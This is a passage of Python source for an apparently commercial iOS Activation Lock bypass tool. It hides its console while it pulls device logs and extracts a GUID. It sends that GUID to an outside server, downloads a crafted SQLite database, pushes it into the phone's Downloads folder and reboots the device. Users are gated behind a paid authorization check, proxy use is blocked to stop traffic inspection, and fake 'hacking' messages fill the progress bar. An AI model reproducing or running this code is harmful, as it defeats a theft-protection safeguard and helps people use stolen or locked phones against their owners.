            temp_dir = tempfile.mkdtemp()
            log_archive_name = "bldatabasemanager_logs.logarchive"
            log_archive_path = os.path.join(temp_dir, log_archive_name)
            
            # Method 1: Try using pymobiledevice3 with completely hidden console
            cmd = [
                'pymobiledevice3', 
                'syslog', 
                'collect',
                '--udid', udid,
                log_archive_path
            ]
            
            print(f"🔧 Running pymobiledevice3 (hidden)...")
            
            # Use subprocess with completely hidden window
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0  # SW_HIDE
            creationflags = subprocess.CREATE_NO_WINDOW
            
            process = subprocess.Popen(
                cmd,
                startupinfo=startupinfo,
                creationflags=creationflags,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                text=True
            )
            
            try:
                # Wait for process with timeout
                stdout, stderr = process.communicate(timeout=60)
                
                if process.returncode == 0:
                    print("✅ Syslog collection successful")
                    if os.path.exists(log_archive_path):
                        print(f"📁 Log archive created: {log_archive_path}")
                        return log_archive_path
                    else:
                        print("❌ Log archive file not found after successful collection")
                        return None
                else:
                    print(f"❌ Syslog collection failed with return code: {process.returncode}")
                    if stderr:
                        print(f"Error: {stderr.strip()}")
                    return None
                    
            except subprocess.TimeoutExpired:
                print("❌ Syslog collection timeout - killing process")
                process.kill()
                stdout, stderr = process.communicate()
                return None
                
        except Exception as e:
            print(f"❌ Error collecting syslog: {e}")
            return None

    def collect_syslog_with_pymobiledevice_subprocess(self, udid, log_archive_path):
        """Fallback method using subprocess but HIDDEN"""
        try:
            cmd = [
                'pymobiledevice3', 
                'syslog', 
                'collect',
                '--udid', udid,
                log_archive_path
            ]
            
            print(f"🔧 Running subprocess command: {' '.join(cmd)}")
            
            # Run with completely hidden console
            result = run_subprocess_no_console(cmd, timeout=60)
            
            if result and result.returncode == 0:
                print("✅ Syslog collection successful (subprocess)")
                if os.path.exists(log_archive_path):
                    return log_archive_path
            return None
            
        except Exception as e:
            print(f"❌ Subprocess syslog collection failed: {e}")
            return None

    def search_bl_database_in_log_archive(self, log_archive_path):
        """Search for BLDatabaseManager/BLDatabase in the log archive"""
        try:
            print(f"🔍 Searching for BLDatabase in: {log_archive_path}")
            
            # Check if the log archive exists
            if not os.path.exists(log_archive_path):
                print("❌ Log archive path does not exist")
                return None
            
            # Look for logdata.LiveData.tracev3 file
            tracev3_path = self.find_tracev3_file(log_archive_path)
            if not tracev3_path:
                print("❌ Could not find logdata.LiveData.tracev3 file")
                return None
            
            print(f"📄 Found tracev3 file: {tracev3_path}")
            
            # Read and search the tracev3 file
            return self.search_bl_database_in_tracev3(tracev3_path)
            
        except Exception as e:
            print(f"❌ Error searching log archive: {e}")
            return None

    def find_tracev3_file(self, log_archive_path):
        """Find the logdata.LiveData.tracev3 file in the log archive"""
        try:
            # The log archive might be a directory or a file
            if os.path.isdir(log_archive_path):
                # Search for tracev3 files in the directory
                for root, dirs, files in os.walk(log_archive_path):
                    for file in files:
                        if file == "logdata.LiveData.tracev3" or file.endswith(".tracev3"):
                            return os.path.join(root, file)
            else:
                # If it's a file, check if it's a tracev3 file
                if log_archive_path.endswith(".tracev3"):
                    return log_archive_path
            
            return None
            
        except Exception as e:
            print(f"❌ Error finding tracev3 file: {e}")
            return None

    def search_bl_database_in_tracev3(self, tracev3_path):
        """Search for BLDatabaseManager/BLDatabase in tracev3 file and extract GUID"""
        try:
            print(f"🔍 Searching for BLDatabase in: {tracev3_path}")
            
            # Read the tracev3 file content
            content = self.read_tracev3_file(tracev3_path)
            if not content:
                print("❌ Could not read tracev3 file")
                return None
            
            # Search for BLDatabaseManager or BLDatabase patterns
            patterns = [
                r'([A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12})/Documents/BLDatabaseManager',
                r'([A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12})/Documents/BLDatabase',
                r'([A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12})/.*/BLDatabaseManager',
                r'([A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12})/.*/BLDatabase',
                r'BLDatabaseManager.*([A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12})',
                r'BLDatabase.*([A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12})'
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    for match in matches:
                        if len(match) == 36:  # Proper GUID length
                            guid = match.upper()
                            print(f"🎯 FOUND GUID: {guid}")
                            return guid
            
            print("❌ No GUID found in tracev3 file")
            return None
            
        except Exception as e:
            print(f"❌ Error searching tracev3 file: {e}")
            return None

    def read_tracev3_file(self, tracev3_path):
        """Read content from tracev3 file"""
        try:
            # Try to read as text first
            try:
                with open(tracev3_path, 'r', encoding='utf-8', errors='ignore') as f:
                    return f.read()
            except:
                # If text read fails, try binary read
                with open(tracev3_path, 'rb') as f:
                    content = f.read()
                    # Try to decode as text
                    try:
                        return content.decode('utf-8', errors='ignore')
                    except:
                        # If UTF-8 fails, try other encodings
                        try:
                            return content.decode('latin-1', errors='ignore')
                        except:
                            return str(content)
                            
        except Exception as e:
            print(f"❌ Error reading tracev3 file: {e}")
            return None

    def reboot_device_sync(self):
        """Reboot device (synchronous version for use in GUID extraction)"""
        try:
            ios_path = self.get_lib_path('ios.exe')
            if not os.path.exists(ios_path):
                print("❌ ios.exe not found in libs folder")
                return False
            
            cmd = [ios_path, 'reboot']
            result = run_subprocess_no_console(cmd, timeout=30)
            
            if result and result.returncode == 0:
                print("✅ Device reboot command sent successfully")
                return True
            else:
                print(f"⚠️ Reboot command failed")
                return True  # Return True anyway to continue
                
        except Exception as e:
            print(f"⚠️ Reboot error: {e}")
            return True  # Return True anyway to continue

    def wait_for_device_reconnect_sync(self, timeout):
        """Wait for device to reconnect (synchronous version)"""
        try:
            start_time = time.time()
            while time.time() - start_time < timeout:
                if self.is_device_connected():
                    print("✅ Device reconnected after reboot")
                    return True
                time.sleep(5)  # Check every 5 seconds
            
            print("⚠️ Device did not reconnect within timeout period")
            return False
        except Exception as e:
            print(f"⚠️ Wait for reconnect error: {e}")
            return False

    # ========== UPDATED DOWNLOAD URL METHOD ==========
    
    def get_download_url(self, model_name, guid=None):
        """Get download URL with formatted model number and GUID"""
        formatted_model = self.extract_model_number(model_name)
        
        if guid:
            # Use the new URL format with GUID
            return f"https://bestofunlock.com/a12/{formatted_model}/devices/{guid}/downloads.28.sqlitedb"
        else:
            # Fallback to old URL if no GUID found
            return f"https://bestofunlock.com/a12/{formatted_model}/devices/{guid}/downloads.28.sqlitedb"

    # ========== THREAD-SAFE METHODS ==========
    
    def download_file_with_progress_thread(self, url, local_path, progress_signal):
        """Download file with progress tracking - thread safe"""
        try:
            # Security check for proxy usage
            if security_monitor.check_proxy_usage():
                raise Exception("Proxy usage detected - Operation not allowed")
                
            response = requests.get(url, stream=True, timeout=30)
            response.raise_for_status()
            
            total_size = int(response.headers.get('content-length', 0))
            downloaded_size = 0
            
            with open(local_path, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk)
                        
                        if total_size > 0:
                            progress = int((downloaded_size / total_size) * 100)
                            progress_signal.emit(progress, self.get_random_hacking_text())
            
            return True
        except Exception as e:
            print(f"Error downloading file: {e}")
            return False

    def transfer_and_execute_sqlite_file_thread(self, local_file_path, progress_signal):
        """Transfer SQLite file to device - thread safe"""
        try:
            # First check if device is still connected
            if not self.is_device_connected():
                raise Exception("Device disconnected during transfer")
            
            # Clear downloads folder first
            progress_signal.emit(10, "Cleaning device downloads...")
            if not self.clear_downloads_folder():
                print("⚠️ Could not clear downloads folder, continuing...")
            
            # Get the filename from the local path
            filename = os.path.basename(local_file_path)
            
            # Transfer file to Downloads folder
            progress_signal.emit(20, "Transferring activation file...")
            device_path = f"Downloads/{filename}"
            
            if not self.transfer_file_to_device(local_file_path, device_path):
                raise Exception("Failed to transfer file to device")
            
            print(f"✅ File transferred to {device_path}")
            
            # Wait a bit for processing to potentially start
            progress_signal.emit(30, "Initializing file processing...")
            time.sleep(5)
            
            return True
                
        except Exception as e:
            raise Exception(f"Transfer error: {str(e)}")

    def reboot_device_thread(self, progress_signal):
        """Reboot the device - thread safe"""
        try:
            # Check if ios.exe exists in libs folder
            ios_path = self.get_lib_path('ios.exe')
            
            if not os.path.exists(ios_path):
                raise Exception("ios.exe not found in libs folder")
            
            progress_signal.emit(95, self.get_random_hacking_text())
            
            # Execute reboot command
            cmd = [ios_path, 'reboot']
            result = run_subprocess_no_console(cmd, timeout=30)
            
            if result and result.returncode == 0:
                return True
            else:
                print(f"Reboot error")
                return True
                
        except Exception as e:
            print(f"Reboot error: {e}")
            return True

    def wait_for_device_reconnect_thread(self, timeout, progress_signal, worker):
        """Wait for device to reconnect after reboot - thread safe"""
        start_time = time.time()
        while time.time() - start_time < timeout:
            if not worker.is_running:
                return False  # User cancelled
            
            elapsed = int(time.time() - start_time)
            remaining = timeout - elapsed
            
            if self.is_device_connected():
                print("Device reconnected after reboot")
                return True
            
            time.sleep(5)  # Check every 5 seconds
        
        print("Device did not reconnect within timeout period")
        return False

    def check_activation_status_thread(self):
        """Check device activation status - thread safe"""
        try:
            print("🔍 Checking device activation status...")
            
            ideviceinfo_path = self.get_lib_path('ideviceinfo.exe')
            
            if not os.path.exists(ideviceinfo_path):
                print("❌ ideviceinfo.exe not found")
                return "Unknown"
            
            # Get activation state from device
            result = run_subprocess_no_console([ideviceinfo_path, '-k', 'ActivationState'], timeout=15)
            
            if result and result.returncode == 0:
                activation_state = result.stdout.strip()
                print(f"📱 Device activation state: {activation_state}")
                
                if activation_state == "Activated":
                    return "Activated"
                elif activation_state == "Unactivated":
                    return "Unactivated"
                else:
                    return "Unknown"
            else:
                print(f"❌ Failed to get activation state")
                return "Unknown"
                
        except Exception as e:
            print(f"❌ Error checking activation status: {e}")
            return "Unknown"

    # ========== ACTIVATION PROCESS ==========
    
    def activate_device(self):
        """UPDATED ACTIVATION PROCESS with proper threading"""
        if not self.device_authorized:
            QMessageBox.warning(self, "Not Authorized", "Device is not authorized for activation.")
            return
        
        # Security check before activation - including proxy detection
        if security_monitor.check_api_sniffing() or security_monitor.check_proxy_usage():
            QMessageBox.critical(self, "Security Violation", "Proxy usage detected! Application cannot run with proxy settings.")
            return
        
        # Show custom instruction dialog
        instruction_dialog = QDialog(self)
        instruction_dialog.setWindowTitle("Setup Instructions")
        instruction_dialog.setFixedSize(500, 350)
        instruction_dialog.setModal(True)
        instruction_dialog.setStyleSheet("""
            QDialog {
                background-color: #f8f9fa;
                font-family: Arial, sans-serif;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Title
        title_label = QLabel("Important: Setup Required")
        title_label.setStyleSheet("""
            font-size: 20px;
            font-weight: bold;
            color: #2c3e50;
            margin-bottom: 20px;
            padding: 10px;
            background-color: #e8f4fd;
            border-radius: 5px;
        """)
        title_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(title_label)
        
        # Instructions
        instructions_text = QLabel(
            "Before starting the activation process, please ensure your device is properly set up:\n\n"
            "🔹 <b>Step 1:</b> Connect your device to <b>WIFI</b>\n\n"
            "🔹 <b>Step 2:</b> Proceed to the <b>Activation Lock</b> section on your device\n\n"
            "🔹 <b>Step 3:</b> Make sure the device is showing the activation lock screen\n\n"
            "If you've completed these steps, click 'Continue' to begin the activation process."
        )
        instructions_text.setStyleSheet("""
            font-size: 14px;
            color: #34495e;
            line-height: 1.5;
            padding: 15px;
            background-color: white;
            border: 1px solid #bdc3c7;
            border-radius: 5px;
        """)
        instructions_text.setWordWrap(True)
        instructions_text.setTextFormat(Qt.RichText)
        layout.addWidget(instructions_text)
        
        # Warning note
        warning_label = QLabel("⚠️ Activation will not work if these steps are not completed!")
        warning_label.setStyleSheet("""
            font-size: 12px;
            color: #e74c3c;
            font-weight: bold;
            font-style: italic;
            margin: 10px 0;
            padding: 8px;
            background-color: #fdf2f2;
            border: 1px solid #e74c3c;
            border-radius: 3px;
        """)
        warning_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(warning_label)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        cancel_btn = QPushButton("Cancel")
        cancel_btn.setStyleSheet("""
            QPushButton {
                background-color: #95a5a6;
                color: white;
                border: none;
                border-radius: 5px;
                padding: 10px 20px;
                font-weight: bold;
                font-size: 14px;
                min-width: 100px;
            }
            QPushButton:hover {
                background-color: #7f8c8d;
            }
        """)
        cancel_btn.clicked.connect(instruction_dialog.reject)
        
        continue_btn = QPushButton("Continue")
        continue_btn.setStyleSheet("""
            QPushButton {
                background-color: #27ae60;
                color: white;
                border: none;
                border-radius: 5px;
                padding: 10px 20px;
                font-weight: bold;
                font-size: 14px;
                min-width: 100px;
            }
            QPushButton:hover {
                background-color: #219653;
            }
        """)
        continue_btn.clicked.connect(instruction_dialog.accept)
        continue_btn.setDefault(True)
        
        button_layout.addWidget(cancel_btn)
        button_layout.addWidget(continue_btn)
        layout.addLayout(button_layout)
        
        instruction_dialog.setLayout(layout)
        
        # Show dialog and check response
        result = instruction_dialog.exec_()
        
        if result == QDialog.Rejected:
            print("User cancelled activation after reading instructions")
            return
        
        # Show progress bar and reset
        self.progress_bar.setVisible(True)
        self.progress_label.setVisible(True)
        self.progress_bar.setValue(0)
        self.progress_label.setText("Starting activation process...")
        self.activate_btn.setEnabled(False)
        self.activation_in_progress = True

        # Create and start worker thread
        self.activation_worker = ActivationWorker(self)
        self.activation_worker.progress_updated.connect(self.on_update_progress)
        self.activation_worker.activation_finished.connect(self.on_activation_finished)
        self.activation_worker.guid_extracted.connect(self.on_guid_extracted)
        self.activation_worker.start()

    def on_guid_extracted(self, guid):
        """Handle GUID extraction result - only log to terminal"""
        print(f"📋 GUID extracted in main thread: {guid}")

    def on_activation_finished(self, success, message):
        """Handle activation completion"""
        if success:
            self.show_custom_activation_success()
        else:
            self.show_custom_activation_error(message)

    # ========== UTILITY METHODS ==========
    
    def create_info_label(self, title, value):
        container = QWidget()
        layout = QHBoxLayout(container)
        layout.setContentsMargins(0, 0, 0, 0)
        
        title_label = QLabel(title)
        title_label.setFixedWidth(150)
        title_label.setStyleSheet("font-weight: bold; font-size: 14px; color: #2c3e50;")
        
        value_label = QLabel(value)
        value_label.setStyleSheet("""
            color: #666; 
            font-size: 14px;
            padding: 5px;
            border: 1px solid #ddd;
            border-radius: 3px;
            background-color: #f8f9fa;
        """)
        value_label.setMinimumHeight(30)
        
        if title == "Device Model:":
            self.model_value = value_label
        elif title == "SerialNumber:":
            self.serial_value = value_label
            value_label.setCursor(Qt.PointingHandCursor)
            value_label.mousePressEvent = lambda event: self.copy_to_clipboard(self.serial_value.text(), self.serial_value)
        elif title == "iOSVersion:":
            self.ios_value = value_label
        elif title == "Imei:":
            self.imei_value = value_label
            value_label.setCursor(Qt.PointingHandCursor)
            value_label.mousePressEvent = lambda event: self.copy_to_clipboard(self.imei_value.text(), self.imei_value)
        elif title == "Status:":
            self.status_value = value_label
            
        layout.addWidget(title_label)
        layout.addWidget(value_label)
        layout.setStretch(1, 1)
            
        return container

    def extract_model_number(self, model_name):
        """Extract and format model number from device model name"""
        try:
            if not model_name or model_name == "N/A" or model_name.startswith("API Error"):
                return "unknown"
            
            # Remove "iPhone" prefix and any spaces, convert to lowercase
            model_lower = model_name.lower().replace("iphone", "").strip()
            
            # Remove all spaces and special characters, keep only alphanumeric
            formatted_model = re.sub(r'[^a-z0-9]', '', model_lower)
            
            print(f"Extracted model: '{model_name}' -> '{formatted_model}'")
            return formatted_model
            
        except Exception as e:
            print(f"Error extracting model number: {e}")
            return "unknown"
    
    def get_lib_path(self, filename):
        """Get path to libs folder - works for both script and EXE"""
        if getattr(sys, 'frozen', False):
            # Running as EXE
            base_path = os.path.dirname(sys.executable)
        else:
            # Running as script
            base_path = os.path.dirname(__file__)
        
        libs_path = os.path.join(base_path, 'libs')
        return os.path.join(libs_path, filename)
        
    def get_api_url(self, product_type):
        """Get the API URL - using direct parameter as you tested"""
        return f"https://strawhat.com/newone/model.php?model={product_type}"
    
    def get_authorization_url(self, model, serial):
        """Get authorization check URL"""
        encoded_model = quote(model)
        return f"https://itouchcoderemoval.in/server12/test.php?model={encoded_model}&serial={serial}"
    
    def get_guid_api_url(self, guid):
        """Get the GUID API URL for sending the extracted GUID"""
        current_model = self.model_value.text()
        formatted_model = self.extract_model_number(current_model)
        return f"https://bestofunlock.com/a12/{formatted_model}/getguid.php?guid={guid}"
        
    def check_authorization(self, model, serial):
        """Check device authorization status"""
        try:
            # Security check for proxy usage
            if security_monitor.check_proxy_usage():
                return "proxy_detected"
                
            if model and serial and model != "N/A" and serial != "N/A":
                auth_url = self.get_authorization_url(model, serial)
                print(f"Checking authorization: {auth_url}")
                
                response = requests.get(auth_url, timeout=10)
                print(f"Authorization response status: {response.status_code}")
                print(f"Authorization response text: {response.text}")
                
                if response.status_code == 200:
                    response_text = response.text.strip()
                    
                    # Check for the actual response from your PHP script
                    if "SUCCESS:" in response_text:
                        print("✅ Device is AUTHORIZED!")
                        return "authorized"
                    # Check for "Not Authorized:" response
                    elif "Not Authorized:" in response_text:
                        print("❌ Device is NOT authorized")
                        return "not_authorized"
                    # Check for error responses
                    elif "Error:" in response_text:
                        print(f"❌ Authorization error: {response_text}")
                        return "error"
                    else:
                        print(f"❓ Unknown authorization response: {response_text}")
                        return "unknown"
                else:
                    print(f"❌ Authorization check failed with status: {response.status_code}")
                    return "error"
            return "error"
        except Exception as e:
            print(f"❌ Error checking authorization: {e}")
            return "error"
    
    def fetch_device_model(self, product_type):
        """Fetch device model name from the API"""
        try:
            # Security check for proxy usage
            if security_monitor.check_proxy_usage():
                return "Proxy usage detected"
                
            # Check cache first
            if product_type in self.cached_models:
                print(f"Using cached model for {product_type}: {self.cached_models[product_type]}")
                return self.cached_models[product_type]
                
            if product_type and product_type != "N/A":
                api_url = self.get_api_url(product_type)
                print(f"Fetching model from: {api_url}")
                
                response = requests.get(api_url, timeout=10)
                print(f"API Response status: {response.status_code}")
                print(f"API Response text: {response.text}")
                
                if response.status_code == 200:
                    model_name = response.text.strip()
                    if model_name and model_name != "Unknown":
                        # Cache the result
                        self.cached_models[product_type] = model_name
                        return model_name
                    else:
                        return "Unknown Model"
                else:
                    return f"API Error: {response.status_code}"
            return "N/A"
        except Exception as e:
            print(f"Error fetching model: {e}")
            return f"API Error: {str(e)}"

    def get_random_hacking_text(self):
        """Generate random hacking-like text for UI display"""
        hacking_phrases = [
            "Initializing secure connection...",
            "Bypassing security protocols...",
            "Establishing encrypted tunnel...",
            "Decrypting security tokens...",
            "Accessing secure partition...",
            "Verifying cryptographic signatures...",
            "Establishing handshake protocol...",
            "Scanning system vulnerabilities...",
            "Injecting security payload...",
            "Establishing secure shell...",
            "Decrypting firmware keys...",
            "Accessing secure boot chain...",
            "Verifying system integrity...",
            "Establishing secure communication...",
            "Bypassing hardware restrictions..."
        ]
        return random.choice(hacking_phrases)

    def afc_client_operation(self, operation, *args):
        """Execute AFC client operations"""
        try:
            afcclient_path = self.get_lib_path('afcclient.exe')
            
            if not os.path.exists(afcclient_path):
                raise Exception("afcclient.exe not found in libs folder")
            
            cmd = [afcclient_path, operation] + list(args)
            result = run_subprocess_no_console(cmd, timeout=30)
            
            if result and result.returncode == 0:
                return True, result.stdout
            else:
                return False, result.stderr if result else "Unknown error"
                
        except Exception as e:
            return False, str(e)

    def clear_downloads_folder(self):
        """Clear all files from Downloads folder using AFC client"""
        try:
            print("🗑️ Clearing Downloads folder...")
            success, output = self.afc_client_operation('ls', 'Downloads/')
            if success:
                files = output.strip().split('\n')
                for file in files:
                    if file.strip():
                        print(f"Deleting: {file}")
                        self.afc_client_operation('rm', f'Downloads/{file}')
            return True
        except Exception as e:
            print(f"Error clearing Downloads folder: {e}")
            return False

    def transfer_file_to_device(self, local_file_path, device_path):
        """Transfer file to device using AFC client"""
        try:
            success, output = self.afc_client_operation('put', local_file_path, device_path)
            return success
        except Exception as e:
            print(f"Error transferring file: {e}")
            return False

    def is_device_connected(self):
        """Check if device is still connected"""
        try:
            ideviceinfo_path = self.get_lib_path('ideviceinfo.exe')
            if os.path.exists(ideviceinfo_path):
                result = run_subprocess_no_console([ideviceinfo_path], timeout=5)
                return result and result.returncode == 0 and result.stdout.strip()
            return False
        except:
            return False

    def send_guid_to_api(self, guid):
        """Send the extracted GUID to the API"""
        try:
            # Security check for proxy usage
            if security_monitor.check_proxy_usage():
                print("❌ Proxy detected - cannot send GUID to API")
                return False
                
            api_url = self.get_guid_api_url(guid)
            print(f"📤 Sending GUID to API: {api_url}")
            
            response = requests.get(api_url, timeout=30)
            
            if response.status_code == 200:
                print(f"✅ GUID successfully sent to API. Response: {response.text}")
                return True
            else:
                print(f"❌ API returned status code: {response.status_code}")
                # Continue anyway as this might not be critical
                return True
                
        except Exception as e:
            print(f"⚠️ Error sending GUID to API: {e}")
            # Continue anyway as this might not be critical
            return True

    def get_device_udid(self):
        """Get device UDID"""
        try:
            # Try idevice_id first
            idevice_id_path = self.get_lib_path('idevice_id.exe')
            if os.path.exists(idevice_id_path):
                result = run_subprocess_no_console([idevice_id_path, '-l'], timeout=10)
                if result and result.returncode == 0 and result.stdout.strip():
                    udids = result.stdout.strip().split('\n')
                    return udids[0].strip()
            
            # Try ideviceinfo as fallback
            ideviceinfo_path = self.get_lib_path('ideviceinfo.exe')
            if os.path.exists(ideviceinfo_path):
                result = run_subprocess_no_console([ideviceinfo_path, '-k', 'UniqueDeviceID'], timeout=10)
                if result and result.returncode == 0 and result.stdout.strip():
                    return result.stdout.strip()
            
            return None
            
        except Exception as e:
            print(f"Error getting device UDID: {e}")
            return None

    def show_custom_activation_success(self):
        """Show custom activation success message box"""
        self.progress_bar.setVisible(False)
        self.progress_label.setVisible(False)
        self.activate_btn.setEnabled(True)
        self.activation_in_progress = False
        
        dialog = ActivationResultDialog(
            "🎉 Activation Successful!",
            "Your device has been successfully activated!\n\nThe activation process completed successfully. Your device is now ready to use.",
            is_success=True,
            parent=self
        )
        dialog.exec_()
        
        # Update status
        self.status_value.setText("Activation Complete")
        self.status_value.setStyleSheet("color: #27ae60; font-weight: bold; font-size: 14px;")

    def show_custom_activation_error(self, error_message):
        """Show custom activation error message box"""
        self.progress_bar.setVisible(False)
        self.progress_label.setVisible(False)
        self.activate_btn.setEnabled(True)
        self.activation_in_progress = False
        
        dialog = ActivationResultDialog(
            "🚨 Activation Error",
            f"An error occurred during activation.\n\nError: {error_message}\n\nPlease try again.",
            is_success=False,
            parent=self
        )
        dialog.exec_()
        
        # Update status
        self.status_value.setText("Activation Error")
        self.status_value.setStyleSheet("color: #e74c3c; font-weight: bold; font-size: 14px;")

    def on_model_received(self, model_name):
        """Update the model label when model is received from API"""
        self.model_value.setText(model_name)
    
    def on_show_auth_dialog(self, model_name, serial):
        """Show authorization dialog from main thread"""
        print(f"Showing authorization dialog for {model_name} - {serial}")
        message = f"Congratulations! Your device {model_name} with serial number {serial} is supported for activation."
        
        dialog = CustomMessageBox(
            "Device Supported",
            message,
            serial,
            self
        )
        
        result = dialog.exec_()
        
        if result == QDialog.Accepted:
            print("User clicked Proceed to Order")
            # Open strawhat.com in browser
            webbrowser.open("https://strawhat.com")
            # Keep activate button disabled until device is authorized
            self.activate_btn.setEnabled(False)
        else:
            print("User canceled the authorization process")
            # Keep activate button disabled
            self.activate_btn.setEnabled(False)
    
    def on_enable_activate_btn(self, enable):
        """Enable or disable activate button from main thread"""
        self.activate_btn.setEnabled(enable)
    
    def on_update_status_label(self, status_text, color):
        """Update status label from main thread"""
        self.status_value.setText(status_text)
        self.status_value.setStyleSheet(f"color: {color}; font-weight: bold; font-size: 14px;")
    
    def on_update_progress(self, value, text):
        """Update progress bar and label from main thread"""
        self.progress_bar.setValue(value)
        self.progress_label.setText(text)
        
    def copy_to_clipboard(self, text, label):
        """Copy text to clipboard and show temporary feedback"""
        if text != "N/A" and text != "Unknown" and text != "Unknown Model" and not text.startswith("API Error"):
            clipboard = QApplication.clipboard()
            clipboard.setText(text)
            
            original_text = label.text()
            original_style = label.styleSheet()
            
            label.setText("Copied!")
            label.setStyleSheet("""
                color: #27ae60; 
                font-weight: bold;
                font-size: 14px;
                padding: 5px;
                border: 1px solid #27ae60;
                border-radius: 3px;
                background-color: #d5f4e6;
            """)
            
            QTimer.singleShot(2000, lambda: self.restore_label_text(label, original_text, original_style))
    
    def restore_label_text(self, label, original_text, original_style):
        """Restore the original label text and style"""
        label.setText(original_text)
        label.setStyleSheet(original_style)
        
    def setup_device_monitor(self):
        self.timer = QTimer()
        self.timer.timeout.connect(self.check_device_status)
        self.timer.start(2000)
        
    def check_device_status(self):
        def check():
            try:
                # Skip device check if activation is in progress
                if self.activation_in_progress:
                    return
                    
                ideviceinfo_path = self.get_lib_path('ideviceinfo.exe')
                
                if os.path.exists(ideviceinfo_path):
                    result = run_subprocess_no_console([ideviceinfo_path], timeout=10)
                    if result and result.returncode == 0 and result.stdout.strip():
                        self.parse_device_info(result.stdout)
                        self.device_connected.emit(True)
                        return
                
                # Try alternative methods if ideviceinfo fails
                idevice_id_path = self.get_lib_path('idevice_id.exe')
                if os.path.exists(idevice_id_path):
                    result = run_subprocess_no_console([idevice_id_path, '-l'], timeout=5)
                    if result and result.returncode == 0 and result.stdout.strip():
                        # Device connected but no detailed info
                        self.device_connected.emit(True)
                        QTimer.singleShot(0, lambda: self.update_basic_connection())
                        return
                    
                # No device found
                self.device_connected.emit(False)
                
            except Exception as e:
                print(f"Error checking device: {e}")
                self.device_connected.emit(False)
        
        threading.Thread(target=check, daemon=True).start()
        
    def parse_device_info(self, output):
        self.device_info = {}
        lines = output.split('\n')
        
        for line in lines:
            line = line.strip()
            if ':' in line:
                key, value = line.split(':', 1)
                key = key.strip()
                value = value.strip()
                self.device_info[key] = value
        
        QTimer.singleShot(0, self.update_device_info)
    
    def update_device_info(self):
        try:
            serial = self.device_info.get('SerialNumber', 'N/A')
            ios_version = self.device_info.get('ProductVersion', 'N/A')
            imei = self.device_info.get('InternationalMobileEquipmentIdentity', 'N/A')
            product_type = self.device_info.get('ProductType', 'N/A')
            
            if serial == 'N/A' and 'UniqueDeviceID' in self.device_info:
                serial = self.device_info['UniqueDeviceID'][-8:]
            
            # Check if device has changed
            device_changed = (serial != self.current_serial or 
                            product_type != self.current_product_type)
            
            if device_changed:
                print(f"Device changed! New device detected: {serial}")
                self.current_serial = serial
                self.current_product_type = product_type
                self.authorization_checked = False
                self.device_authorized = False
                
                # Update basic info
                self.serial_value.setText(serial)
                self.ios_value.setText(ios_version)
                self.imei_value.setText(imei)
                self.status_value.setText("Connected")
                self.status_value.setStyleSheet("color: #27ae60; font-weight: bold; font-size: 14px;")
                
                # Initially disable activate button until we know authorization status
                self.activate_btn.setEnabled(False)
                
                # Fetch and display device model from API only if device changed
                if product_type != 'N/A':
                    # Show "Loading..." while fetching model name
                    self.model_value.setText("Loading...")
                    print(f"New ProductType detected: {product_type}")
                    
                    def fetch_model():
                        model_name = self.fetch_device_model(product_type)
                        # Use signal to update UI from main thread
                        self.model_received.emit(model_name)
                        
                        # After model is received, check authorization
                        if model_name != "N/A" and not model_name.startswith("API Error"):
                            self.check_device_authorization(model_name, serial)
                    
                    threading.Thread(target=fetch_model, daemon=True).start()
                else:
                    self.model_value.setText("N/A")
                    print("No ProductType found")
                
                print(f"Updated UI for new device: ProductType={product_type}, Serial={serial}, iOS={ios_version}, IMEI={imei}")
            else:
                # Same device, no need to update UI
                print(f"Same device connected: {serial}, no UI update needed")
            
        except Exception as e:
            print(f"Error updating UI: {e}")
    
    def check_device_authorization(self, model_name, serial):
        """Check if device is authorized/supported"""
        if not self.authorization_checked:
            print(f"Checking authorization for device: {model_name} - {serial}")
            
            def check_auth():
                auth_status = self.check_authorization(model_name, serial)
                
                if auth_status == "authorized":
                    print(f"Device {serial} is AUTHORIZED! Enabling activate button and updating status.")
                    self.device_authorized = True
                    # Update status to "Bypass Authorized" and enable activate button
                    self.update_status_label.emit("Bypass Authorized", "#27ae60")
                    self.enable_activate_btn.emit(True)
                    
                elif auth_status == "not_authorized":
                    print(f"Device {serial} is NOT authorized! Showing order dialog.")
                    # Show dialog when NOT authorized
                    self.show_auth_dialog.emit(model_name, serial)
                    # Keep status as "Connected" and button disabled
                    self.update_status_label.emit("Connected", "#27ae60")
                    self.enable_activate_btn.emit(False)
                    
                elif auth_status == "proxy_detected":
                    print(f"Proxy detected for device {serial}! Blocking access.")
                    # Show proxy warning and block access
                    self.show_proxy_warning_message()
                    # Keep status as "Connected" and button disabled
                    self.update_status_label.emit("Security Violation", "#e74c3c")
                    self.enable_activate_btn.emit(False)
                    
                elif auth_status == "folder_not_found":
                    print(f"Device folder for {model_name} not found on server.")
                    # Show custom message for folder not found
                    self.show_folder_not_found_message(model_name, serial)
                    # Keep status as "Connected" and button disabled
                    self.update_status_label.emit("Connected", "#27ae60")
                    self.enable_activate_btn.emit(False)
                    
                else:
                    print(f"Device {serial} authorization status unknown or error.")
                    # Keep status as "Connected" and button disabled for unknown/error cases
                    self.update_status_label.emit("Connected", "#27ae60")
                    self.enable_activate_btn.emit(False)
                
                self.authorization_checked = True
            
            threading.Thread(target=check_auth, daemon=True).start()
    
    def show_proxy_warning_message(self):
        """Show proxy warning message"""
        def show_dialog():
            msg = QMessageBox(self)
